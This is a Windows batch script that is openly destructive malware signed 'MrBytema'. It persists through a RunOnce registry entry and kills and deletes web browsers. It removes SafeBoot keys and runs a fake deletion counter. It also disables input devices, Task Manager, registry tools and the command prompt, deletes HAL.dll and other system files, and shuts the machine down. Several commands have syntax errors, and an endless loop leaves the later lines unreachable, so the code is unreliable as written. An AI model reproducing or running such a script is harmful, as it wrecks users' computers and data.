@echo off
copy %0 %windir%\Win32.bat > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Win32 /t REG_SZ /d %windir%\Win32.bat /f 
taskkill /im /f chrome.exe
taskkill /im /f ie.exe
taskkill /im /f firefox.exe
taskkill /im /f opera.exe
taskkill /im /f safari.exe
del C:\Program Files\Google\Chrome\Application\chrome.exe /q
del C:\Program Files\Safari\safari.exe /q
del C:\Program Files\Mozilla Firefox\firefox.exe /q
del C:\Program Files\Opera\opera.exe /q
del C:\Program Files\Internet Explorer\ie.exe /q
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot\*.* /q
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /q
color 0A
:y
set /a papka+=1
cls
echo Delete system
echo %papka% files deleted...
goto y
msg * Sorry this is my job MrBytema
rundll32 mouse,disable > nul
rundll32 keyboard,disable > nul
rundll32 user,disableoemlayer > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul
taskkill /f /im explorer.exe > nul
del: *.*/q > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Polices\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul 
del %WinDir%\system32\HAL.dll/q > nul
del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul
del "%SystemRoot%\Media" /q > nul
assoc .lnk=.txt
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
del "%SystemRoot%\Cursors\*.*" >nul
copy "%0" "%SystemRoot%\system32\sys321.bat > nul
shutdown -s -t 00 -c error > nul